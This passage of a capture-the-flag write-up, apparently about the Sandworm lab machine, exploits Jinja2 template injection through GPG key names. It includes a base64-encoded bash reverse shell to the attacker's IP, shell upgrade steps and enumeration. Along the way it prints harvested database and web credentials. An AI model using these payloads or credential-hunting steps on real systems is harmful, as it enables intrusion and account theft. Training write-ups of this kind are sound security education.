gpg: revocation certificate stored as '/home/oxdf/.gnupg/openpgp-revocs.d/9F399D5F78B7C633977BB89F5D29E3386F54FD52.rev'
public and secret key created and signed.

pub   rsa3072 2023-11-14 [SC] [expires: 2025-11-13]
      9F399D5F78B7C633977BB89F5D29E3386F54FD52
uid                      oxdf{{7*7}}_${7*7}_${{7*7}}_#{{7*7}}_*{7*7} <ssti@ssa.htb>
sub   rsa3072 2023-11-14 [E] [expires: 2025-11-13]

```

Because I have two secret keys in my keyring, I’ll need to specify which one to sign with with `--local-user`:

```

oxdf@hacky$ gpg --clearsign -o- --local-user ssti@ssa.htb test.msg
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

this is a test message for the SSA
-----BEGIN PGP SIGNATURE-----

iQHBBAEBCgArFiEEnzmdX3i3xjOXe7ifXSnjOG9U/VIFAmVTtB0NHHNzdGlAc3Nh
Lmh0YgAKCRBdKeM4b1T9UopSDACfYDhKZ+7tVUCFYf8Nb4W8++h09Sri4RHVSNfK
NBA9OLeyJYswY8ILpBz6dxYJ/ytHFotXYz1LxKP1VHAHVJn7hWsl+sJSQtTKJcsr
IXO2j2zijg16oSuzMq7q6uTO61BIFSGELHr6Dl+p67SWiIDqwxTPN76JOJmRECq6
+Idc9z3xggius+tCMkB3b2spUNMwdDG0mClAKRN7Be4Lwo/yRq5kgktBLRmP27yY
ShmU/1UbpYKhHK1iCywgLQnd+sGDpeV92uTbbRp8fPy4/3KJ5qW14pFhouuCjC/V
3jgb+B0t4r4Yr2taxnC95vreVzwlErLaSMV+tvEwGSwBBJL6wpxldg+5VYwFUj+9
TwCmxGeoeAydgEZTRCa60wjuGQeIvDPooWSt13zDAM6dWruog+xCitJ+QpDbR4+1
gTa7kRufKAlHUqFhU2GoapSYTZJhs4vI6gqkNCP0oSVxmx0X5cubiURRcn7CC1h3
OEgazofaQ+XmEQ2lNy7UM04MCEU=
=0Qam
-----END PGP SIGNATURE-----

```

I’ll get the new public key (`gpg --export -a ssti@ssa.htb`) and put them both into the demo form. There are several “49” strings in the popup!

![image-20231114125629361](/img/image-20231114125629361.png)

It looks like any time I had `{{ }}` it is handled as code, which suggests the Flask default template engine, Jinja2.

### RCE

To test for code execution, I’ll grab a payload from further down on the [HackTricks SSTI page](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#jinja2-python):

```

{{ namespace.__init__.__globals__.os.popen('id').read() }}

```

The steps here are not too complex:
1. `gpg --gen-key` to make a new key, with that payload as the username, and the email being something new I can remember (so like `rce-id@ssa.htb` for this one that runs `id`).

   ```

   oxdf@hacky$ gpg --gen-key                                                                            
   gpg (GnuPG) 2.2.27; Copyright (C) 2021 Free Software Foundation, Inc.
   This is free software: you are free to change and redistribute it.
   There is NO WARRANTY, to the extent permitted by law.           
                                                                          
   Note: Use "gpg --full-generate-key" for a full featured key generation dialog.
                                                                          
   GnuPG needs to construct a user ID to identify your key.        
                                                                          
   Real name: {{ namespace.__init__.__globals__.os.popen('id').read() }}
   Email address: rce-id@ssa.htb                                   
   You selected this USER-ID:                                      
       "{{ namespace.__init__.__globals__.os.popen('id').read() }} <rce-id@ssa.htb>"
                                                                          
   Change (N)ame, (E)mail, or (O)kay/(Q)uit? o                     
   We need to generate a lot of random bytes. It is a good idea to perform
   some other action (type on the keyboard, move the mouse, utilize the 
   disks) during the prime generation; this gives the random number
   generator a better chance to gain enough entropy.               
   We need to generate a lot of random bytes. It is a good idea to perform
   some other action (type on the keyboard, move the mouse, utilize the 
   disks) during the prime generation; this gives the random number
   generator a better chance to gain enough entropy.               
   gpg: key D84D2379F42639E4 marked as ultimately trusted          
   gpg: revocation certificate stored as '/home/oxdf/.gnupg/openpgp-revocs.d/042AC4F000212519441CF636D84D2379F42639E4.rev'
   public and secret key created and signed.                       
                                                                          
   pub   rsa3072 2023-11-14 [SC] [expires: 2025-11-13]             
         042AC4F000212519441CF636D84D2379F42639E4                  
   uid                      {{ namespace.__init__.__globals__.os.popen('id').read() }} <rce-id@ssa.htb>
   sub   rsa3072 2023-11-14 [E] [expires: 2025-11-13] 

   ```
2. Sign any message with `gpg --clearsign` giving the new user with `--localuser` to get the signed message.

   ```

   oxdf@hacky$ gpg --clearsign -o- --local-user rce-id@ssa.htb test.msg                                 
   -----BEGIN PGP SIGNED MESSAGE-----                              
   Hash: SHA512                                                    
                                                                          
   this is a test message for the SSA
   -----BEGIN PGP SIGNATURE-----
                                                                          
   iQHDBAEBCgAtFiEEBCrE8AAhJRlEHPY22E0jefQmOeQFAmVTtXkPHHJjZS1pZEBz
   c2EuaHRiAAoJENhNI3n0Jjnkd18MALrbVvuzRBBA5qj/CBuscVBG8MVOqNeInwqj
   2r5B1rDEwetLcf0hLUS4L4Uzyegi3CcxMsV2HBsmi1QMrTH3UpiJwe9P9o/Rfgem
   B3/hUnmBJlSqxJZXNU1+kX7FRIuCFzAy9sPDY6kUmhW24wF8nYjkpZsW7Srg9VQi
   T5o7a0/nKlFgv6EVOYTD0oOs9AoWW/8Qjik2NkfiWo8WloGgcWp4syCL67loF4Mw
   3UZAK4pCI0YiN2m8OoeViNBHVbyViDFrtkbTY4X+H/kYULO2k/EPZj6A84TNO9WI
   PjMCGvQqXqki8QCH76rSnQUG/g80rZlCKICOD+KHzLBHT1Iswhu5vbUKFT4l7zMV
   ON+oqSssSPnimr2jJH4AwLToYcZ3mfOaXWVhMAD1dT1QnfbuyExNt46HtQKIv3km
   ysBroe/r7WQIgFA5XunmehALY4mL0J+LrwpOA+sWPaOTtiVGZitWjBbbVynhTPlk
   9hIzwJIqIqNkavwfi/Va7CsRtvz15g==
   =YVMd
   -----END PGP SIGNATURE-----

   ```
3. Dump that user’s public key with `gpg --export -a`:

   ```

   oxdf@hacky$ gpg --export -a rce-id@ssa.htb                                                           
   -----BEGIN PGP PUBLIC KEY BLOCK-----
      
   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
   VZmZVME7kgvVkPW/pC4bWcMdrw==
   =OcEz
   -----END PGP PUBLIC KEY BLOCK-----

   ```
4. Enter the public key and signed message into the site and submit.

The result is code execution, as the result of the `id`command is clearly there in the returned text:

![image-20231114130333970](/img/image-20231114130333970.png)

### Shell

To get a shell on Sandworm I’ll try to create a SSTI payload that connects back with a reverse shell. I learned earlier that `gpg` won’t let me have `<` or `>` in my name. Trying here fails:

```

Real name: {{ namespace.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"').read() }}
Invalid character in name
The characters '<' and '>' may not appear in name
Real name:

```

I’ll encode the reverse shell in base64 (the first result would probably work, but I like to add spaces to get rid of characters like `+` and `=` and it doesn’t change the command):

```

oxdf@hacky$ echo 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1' | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0MyAwPiYxCg==
oxdf@hacky$ echo 'bash  -i >& /dev/tcp/10.10.14.6/443 0>&1' | base64
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMQo=
oxdf@hacky$ echo 'bash  -i >& /dev/tcp/10.10.14.6/443 0>&1 ' | base64
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMSAK

```

I can test this on my own system by starting `nc -lvnp 443` in one window, and then running:

```

echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMSAK | base64 -d | bash

```

It connects with a shell, which shows it works. I’ll add that to the SSTI payload:

```

{{ namespace.__init__.__globals__.os.popen('echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMSAK | base64 -d | bash').read() }}

```

Now I repeat the steps from above:

```

oxdf@hacky$ gpg --gen-key 
...[snip]...
Real name: {{ namespace.__init__.__globals__.os.popen('echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMSAK | base64 -d | bash').read() }}
Email address: rce-rev@ssa.htb
You selected this USER-ID:
    "{{ namespace.__init__.__globals__.os.popen('echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMSAK | base64 -d | bash').read() }} <rce-rev@ssa.htb>"
...[snip]...
oxdf@hacky$ gpg --clearsign -o- --local-user rce-rev@ssa.htb test.msg
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

this is a test message for the SSA
-----BEGIN PGP SIGNATURE-----

iQHEBAEBCgAuFiEEaPTvcECSM3P05qiDKfMo+uSKXZIFAmVTuGYQHHJjZS1yZXZA
c3NhLmh0YgAKCRAp8yj65IpdknPQC/0QpEh+5M5DMC+DRPyLu0HE+VfVZeQ45pOH
S5l2KW1+Vmj8ptEveo6RnWF4I82RACrX6Rd/grY9E8abaY6WFGunbWMXlFPyAGc7
IGxzd02uvABwUSxiZemJnJEI1kmVh7cqhaKkYiDMyG6Xy3WRl6sgoFm7HJOq/SKg
SB8/eL0B74BvdKaMrprka/q3VJQphBQwWJDwuDJfyKuGIR7BBqLgm6cgtasCXFo1
qZRYEKS9h8d9kzqUR6NrJFSO3yY/78LF3UaHt+3KRlDKEiGUhFJQDIR064J961nV
3Nsp1YTIW8KYpnfcIIbM+VOFo/eDiPCyBKM67p8zGIGotgLB9wpCvKiD0JIHVMmW
S3abZLXMmAtmrsW9ZGo5L1/FD92T1r0vYxlH+L6KRnQYzSYy+tskBPWjvfHZW6yV
PtvWjEpFVio3SP5647p6+AbrboXfxZvcqMoePzWaVlNFst0hQDClXaDYaWeDxWv4
EDwVLMWm2GplPfawE+Bg0I4HvSgj7U4=
=dDIr
-----END PGP SIGNATURE-----
oxdf@hacky$ gpg --export -a rce-rev@ssa.htb
-----BEGIN PGP PUBLIC KEY BLOCK-----

mQGNBGVTuBkBDADF3/fo3OL+jyM1HYyInEguIKCXv9lseHpIHzzjU/+Q2womH8zq
xwatpT3j2f5N8TGhtS3KsG9pwNxS6+Oj4YS5IzSMOg164fXJLy0nAh0OcEpr3/ei
yy/2JxwvyL1HYXS/v5sXb9pZAVk3GP4rUSTS7itugPqE/MzhegBwHiZa3HgSBxq5
C23j5BIQOdGrdYqceVWHtxSqYu/6hTo508+lpdqZZ9temaaz2l063GD0ck0jklKT
txeJyHUDmsDgRbDvC6kxCmg4coFRJoWw47+b2fIY3Mw5rMfq9vmnCfhAPxb/dCwB
Hc27MhA8wywNbutge9nfemgdlyCQ65C3UwbUCXH1ERqcJrbNlFb1ejmst6SjwU2Y
wXC4PweADTsCfu1514sfGJI0DMWFoxMH5gEgHySoAqNandJGsCr4WXFJhXQzVQOc
dMZQh8DS3NveD+SquTKddo4CYe3uhFaXmKn/htnzdIBeFcNYKqjegXpd5nSc5Rg+
yHxJIF1HxDlDjtkAEQEAAbSae3sgbmFtZXNwYWNlLl9faW5pdF9fLl9fZ2xvYmFs
c19fLm9zLnBvcGVuKCdlY2hvIFltRnphQ0FnTFdrZ1BpWWdMMlJsZGk5MFkzQXZN
VEF1TVRBdU1UUXVOaTgwTkRNZ01ENG1NU0FLIHwgYmFzZTY0IC1kIHwgYmFzaCcp
LnJlYWQoKSB9fSA8cmNlLXJldkBzc2EuaHRiPokB1AQTAQoAPhYhBGj073BAkjNz
9OaogynzKPrkil2SBQJlU7gZAhsDBQkDwmcABQsJCAcCBhUKCQgLAgQWAgMBAh4B
AheAAAoJECnzKPrkil2S1UoL/2K2unHJpZtQhLmUXqWkUnDGgcJxtSR55NSE08E7
CgyUG7dcwcruf5jJjXeGGZpQcSOmhOuRUdZYLOPXkjF9EWhcWHzPw4+cOlgnmZxa
F63Cu2aSR5L/0BwZOKUw9l6Ruk2q+dFzoT+wwOw1QuPZ8t6VcvCVLDiKJ71tiSgk
nllNVGU0nsFNF/++jIjzl6Fbtj05ljfmNdboIZRlGuH6Bi9mh5wU1txc3+eTJ8/I
S27kUlkSBuRDYJkx2cQrW+JOQrBF0AN8+z4Ku30yDS6p8lqTDk8iCWbLjDK19FIE
wVOV12vMkLQVEsv39PPTHZkjmPK1BOEpGi2f8ZTF2ipK/lgXUrAGq0cpxJFurhBm
U0ONNmlwTnPR2ircAaR+TtEL9BoSHDs9mRKe028u/YVZxD+FDfvEWsWOZIrJvZjG
MEoH89R4SJGVOtSzXqCP5cgzS/1B1qc8yY2ymyAwmjEqVWSU8hm7JokS6ApNK+0M
OSv4eA8KHOW/VfHusaYpKR2Ai7kBjQRlU7gZAQwAtBsJc4ZM8JvfNub9IyTxP7MK
M1Kq3RDDK9ghKN2SrecvxsSZ4o+8hiYer7aBevxRfczM6hEUIIFSO4e81203NWQc
GoE/BthFK89uLMCHsL/raVIhmc2u61u2Oz617gy+9fgtgKsqfshnGjLNJ4TZNW8i
730jvQ+5Tf65IMLdclwItJ3YUFrEnnELymV3T30cFnx3ou6v9ESgrZrntsxjR3f8
GRLzYPnB4nQ89b6bIfoE/cV4rv3ul7AErK9T2RRRO8HHqcHVWcB7Hnij063zXsNi
pFJKkAxASNfhQHOFHJBuiCnrM2/HeeT4nnr/9lK+fkxo0uI6dfFAaRYac95iHX1R
uMTGFHzWW0Aw/CTaj+dFjZX8A6wFJ/kwvaWh/woXN2uL7UtyvLyhsDIXzu3Deyhp
Vv3V867L1wnEaCuvYl2PQkMSgQ7TPKX8VccrSLWiuc/aBeKDbENt6pqOLGn+gPAN
EVigVQjlIEkwHHBTHIeT7AzlhiSUlCdHknTgTJq9ABEBAAGJAbwEGAEKACYWIQRo
9O9wQJIzc/TmqIMp8yj65IpdkgUCZVO4GQIbDAUJA8JnAAAKCRAp8yj65IpdkoZD
DACNIrLtVsTYXCWvkNZAmQizlcylIObfRwqwbTfOCmTDpvUH+kgSzW4YgBb9Xf1f
e6sJeI9H255L5ibz2I5FcJe27BBjYlGH7pYX3KFvPIK+9SV7OLh6/CG2Ez+Q49Qe
mUSYdlLRlb6A+42TK/3RXkyTiD6S0jhPYBdxPkAcclxq7IiJoeah14z7nsVgSS8R
wxwvr4jBLEJcidhHx6xnXOjxLGyZxLvwms1YPRUAWQI7WinqLKekvP9Lyzw8yftu
O3Z/5pjNZKOdocuCxs8S5XGs7shQmv1M3fiYT3JuzDZ00nBJoRhY/sWIperaQOd1
3O6Vpan63QV7Hatadg+eSmkpf2FOaMb2VEoehxDPFyut3JbJSG0pIXAzcZbwdcXP
K8J4ckXxJheyUwP+qjddR2rbz89SDwVHmB1Y4tx2oTxNWOWpYkpZSmAxeDLJOpTa
fyNyB5rUFFnOdwy0q5dziMOn43QdlYRtzATiJbAldQe5ge5Yelte842DKEhrPSHQ
ARc=
=GTRb
-----END PGP PUBLIC KEY BLOCK-----

```

With `nc` listening, I’ll submit these to the site and get a shell as atlas:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.218 49352
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
/usr/local/sbin/lesspipe: 1: dirname: not found
atlas@sandworm:/var/www/html/SSA$ id
uid=1000(atlas) gid=1000(atlas) groups=1000(atlas)

```

## Shell as silentobserver

### Jail

#### Shell Upgrade

The first thing I try to do when I get a shell is upgrade it to a full PTY to get things like up arrow and delete. Typically I do that with `script` and `stty` using the trick I break down in detail [in this video](https://www.youtube.com/watch?v=DqE6DxqJg8Q). Unfortunately, when I run `script`, it fails:

```

atlas@sandworm:/var/www/html/SSA$ script /dev/null -c /bin/bash
Could not find command-not-found database. Run 'sudo apt update' to populate it.
script: command not found

```

`script` is one method to get a pseudo terminal assigned to this session. Without `script`, I can try Python:

```

atlas@sandworm:/var/www/html/SSA$ python -c 'import pty; pty.spawn("/bin/bash")'
Could not find command-not-found database. Run 'sudo apt update' to populate it.
python: command not found

```

It can’t find `python` either. `python3` does run, but with an error as well:

```

atlas@sandworm:/var/www/html/SSA$ python3 -c 'import pty; pty.spawn("/bin/bash")'
/usr/local/sbin/lesspipe: 1: dirname: not found

```

Still, it worked enough that the rest of the trick works:

```

atlas@sandworm:/var/www/html/SSA$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
Could not find command-not-found database. Run 'sudo apt update' to populate it.
reset: command not found
atlas@sandworm:/var/www/html/SSA$

```

#### Limited Commands

Many commands return the same message about not being able to find the command-not-found database. For example, `touch` is missing:

```

atlas@sandworm:/tmp$ touch test
Could not find command-not-found database. Run 'sudo apt update' to populate it.
touch: command not found

```

Many common networking tools as well:

```

atlas@sandworm:/tmp$ ifconfig
Could not find command-not-found database. Run 'sudo apt update' to populate it.
ifconfig: command not found
atlas@sandworm:/tmp$ ip
Could not find command-not-found database. Run 'sudo apt update' to populate it.
ip: command not found
atlas@sandworm:/tmp$ netstat 
Could not find command-not-found database. Run 'sudo apt update' to populate it.
netstat: command not found

```

#### Filesystem

There’s not much on the filesystem of interest. `/bin` has only a handful of binaries:

```

atlas@sandworm:/$ ls bin/
base64    bash  dash   gpg        groups  lesspipe  python3     sh
basename  cat   flask  gpg-agent  id      ls        python3.10

```

This is way less than on a standard machine, because of the jail. `/opt` is empty (I’ll see later this is because of the jail, and look at the config in [Beyond Root](#firejail-config)):

```

atlas@sandworm:/opt$ ls -la
total 4
drwxr-xr-x  2 nobody nogroup   40 Nov  6 19:53 .
drwxr-xr-x 19 nobody nogroup 4096 Jun  7 13:53 ..

```

### Enumeration

#### Process Triage

I can’t run `ps` either. But I can access `/proc`:

```

atlas@sandworm:/proc$ ls
1      52439       diskstats      kcore        mounts        swaps
20     52440       dma            keys         mpt           sys
20089  52916       driver         key-users    mtrr          sysrq-trigger
20091  acpi        dynamic_debug  kmsg         net           sysvipc
52380  bootconfig  execdomains    kpagecgroup  pagetypeinfo  thread-self
52383  buddyinfo   fb             kpagecount   partitions    timer_list
52384  bus         filesystems    kpageflags   pressure      tty
52405  cgroups     fs             loadavg      schedstat     uptime
52406  cmdline     interrupts     locks        scsi          version
52412  consoles    iomem          mdstat       self          version_signature
52429  cpuinfo     ioports        meminfo      slabinfo      vmallocinfo
52432  crypto      irq            misc         softirqs      vmstat
52433  devices     kallsyms       modules      stat          zoneinfo

```

Each numbered directory represents a process and will have a `cmdline` file with the command line called to start the process. These are missing newlines at the end, so it’s a bit messy, but a quick way to take a look is just to `cat` them all together (I’ll make this more readable in a minute):

```

atlas@sandworm:/proc$ cat */cmdline
/usr/local/bin/firejail--profile=webappflaskrungpg-agent--homedir/home/atlas/.gnupg--use-standard-socket--daemonscdaemon--multi-server/usr/bin/python3/usr/local/sbin/flaskrun/bin/sh-cecho YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMSAK | base64 -d | bashbashbash-ipython3-cimport pty; pty.spawn("/bin/bash")/bin/bashpython3/bin/sh-cecho YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMSAK | base64 -d | bashbashbash-ipython3-cimport pty;pty.spawn("/bin/bash")/bin/bashcat1/cmdline20089/cmdline20091/cmdline20/cmdline52380/cmdline52383/cmdline52384/cmdline52405/cmdline52406/cmdline52412/cmdline52429/cmdline52432/cmdline52433/cmdline52439/cmdline52440/cmdlineself/cmdlinethread-self/cmdlinecat1/cmdline20089/cmdline20091/cmdline20/cmdline52380/cmdline52383/cmdline52384/cmdline52405/cmdline52406/cmdline52412/cmdline52429/cmdline52432/cmdline52433/cmdline52439/cmdline52440/cmdlineself/cmdlinethread-self/cmdline

```

At least for the ones I can read, `firejail` jumps out.

For a better look at the processes, I’ll write a quick `bash` oneliner loop, which I’ll show here with added whitespace:

```

ls | while read d; do 
  cat "$d/cmdline" 2>/dev/null 
  && echo " [$d]"; 
done

```

It’s going to read all the items in the current directory (`/proc`), and then for each try to `cat` a `cmdline` file from that directory (`cat "$d/cmdline"`). If that fails, the output / error messages go to `/dev/null` (`2>/dev/null`). `&&` means keep going only if the previous command succeeded, and in that case, it will print the pid of the file at the end. The result looks like:

```

atlas@sandworm:/proc$ ls | while read d; do cat "$d/cmdline" 2>/dev/null && echo " [$d]"; done
/usr/local/bin/firejail--profile=webappflaskrun [1]
/usr/bin/python3/usr/local/sbin/flaskrun [20]
gpg-agent--homedir/home/atlas/.gnupg--use-standard-socket--daemon [20089]
scdaemon--multi-server [20091]
/bin/sh-cecho YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMSAK | base64 -d | bash [52380]
bash [52383]
bash-i [52384]
python3-cimport pty; pty.spawn("/bin/bash") [52405]
/bin/bash [52406]
python3 [52412]
/bin/sh-cecho YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMSAK | base64 -d | bash [52429]
bash [52432]
bash-i [52433]
python3-cimport pty;pty.spawn("/bin/bash") [52439]
/bin/bash [52440]
/bin/bash [53338]
catself/cmdline [self]
catthread-self/cmdline [thread-self]

```

This output still has nulls where spaces should be, so they appear missing. Still I can see what’s going on. All I can see is processes running as atlas (from the jail). There’s the `firejail` jail with the `webappflaskrun` profile, Flask running presumably the webapp (I can verify that by going into `20/cwd` and seeing it matches `/var/www/html/SSA`), the `gpg-agent`, and then mostly just stuff I created exploiting the box.

#### Web

The website lives in `var/www/html/SSA/SSA`:

```

atlas@sandworm:/var/www/html/SSA/SSA$ ls
app.py       models.py    src     submissions
__init__.py  __pycache__  static  templates

```

There’s not much useful in the application, though I’ll go through it in [Beyond Root](#exploring-flask) just to understand it. However, in `__init__.py`, there’s a database connection string used by the Python ORM SQLAlchemy:

```

from flask import Flask
from flask_login import LoginManager
from flask_sqlalchemy import SQLAlchemy

db = SQLAlchemy()

def create_app():
    app = Flask(__name__)

    app.config['SECRET_KEY'] = '91668c1bc67132e3dcfb5b1a3e0c5c21'
    app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql://atlas:GarlicAndOnionZ42@127.0.0.1:3306/SSA'

    db.init_app(app)

    # blueprint for non-auth parts of app
    from .app import main as main_blueprint
    app.register_blueprint(main_blueprint)

    login_manager = LoginManager()
    login_manager.login_view = "main.login"
    login_manager.init_app(app)
    
    from .models import User
    @login_manager.user_loader
    def load_user(user_id):
        return User.query.get(int(user_id))

    return app

```

I don’t have a good way to connect to it at the moment (`mysql` isn’t allowed in the jail). I could tunnel a connection to it, but I’ll come back to it after I get out of the jail.

#### Home Directory

atlas’ home directory is in `/home/atlas`. There’s another user home directory, `silentobserver`:

```

atlas@sandworm:~$ ls ..
atlas  silentobserver
atlas@sandworm:~$ cd ../silentobserver/
bash: cd: ../silentobserver/: Permission denied

```

atlas’ home directory has the standard stuff:

```

atlas@sandworm:~$ ls -la
total 44
drwxr-xr-x 8 atlas  atlas   4096 Jun  7 13:44 .
drwxr-xr-x 4 nobody nogroup 4096 May  4  2023 ..
lrwxrwxrwx 1 nobody nogroup    9 Nov 22  2022 .bash_history -> /dev/null
-rw-r--r-- 1 atlas  atlas    220 Nov 22  2022 .bash_logout
-rw-r--r-- 1 atlas  atlas   3771 Nov 22  2022 .bashrc
drwxrwxr-x 2 atlas  atlas   4096 Jun  6 08:49 .cache
drwxrwxr-x 3 atlas  atlas   4096 Feb  7  2023 .cargo
drwxrwxr-x 4 atlas  atlas   4096 Jan 15  2023 .config
drwx------ 4 atlas  atlas   4096 Nov 14 18:18 .gnupg
drwxrwxr-x 6 atlas  atlas   4096 Feb  6  2023 .local
-rw-r--r-- 1 atlas  atlas    807 Nov 22  2022 .profile
drwx------ 2 atlas  atlas   4096 Feb  6  2023 .ssh

```

`.cargo` is interesting as it implies the use of the Rust programming language (more later). There are private keys in the `.gnupg` folder, but nothing I can do with them.

The `.config` directory has folders for both `firejail` and `httpie`:

```

atlas@sandworm:~/.config$ ls
firejail  httpie
atlas@sandworm:~/.config$ ls firejail/
ls: cannot open directory 'firejail/': Permission denied

```

I can’t access `firejail`.

#### httpie

[httpie](https://httpie.io/) is a http client similar to `curl` made for testing APIs. In this directory, there’s a single folder, `sessions`, with a single directory, `localhost:5000`:

```

atlas@sandworm:~/.config$ ls httpie/
sessions
atlas@sandworm:~/.config$ cd httpie/sessions/
atlas@sandworm:~/.config/httpie/sessions$ ls
localhost_5000

```

In that is an `admin.json` file:

```

atlas@sandworm:~/.config/httpie/sessions$ ls localhost_5000/ 
admin.json

```

This is a configuration file meant to help with testing, and it has both a session cookie and creds for the page:

```

atlas@sandworm:~/.config/httpie/sessions/localhost_5000$ cat admin.json  
{
    "__meta__": {
        "about": "HTTPie session file",
        "help": "https://httpie.io/docs#sessions",
        "httpie": "2.6.0"
    },
    "auth": {
        "password": "quietLiketheWind22",
        "type": null,
        "username": "silentobserver"
    },
    "cookies": {
        "session": {
            "expires": null,
            "path": "/",
            "secure": false,
            "value": "eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkludmFsaWQgY3JlZGVudGlhbHMuIl19XX0.Y-I86w.JbELpZIwyATpR58qg1MGJsd6FkA"
        }
    },
    "headers": {
        "Accept": "application/json, */*;q=0.5"
    }
}

```

#### Admin Panel

It’s completely unnecessary as far as solving the box, but these creds do work to login to `/admin` on the webpage:

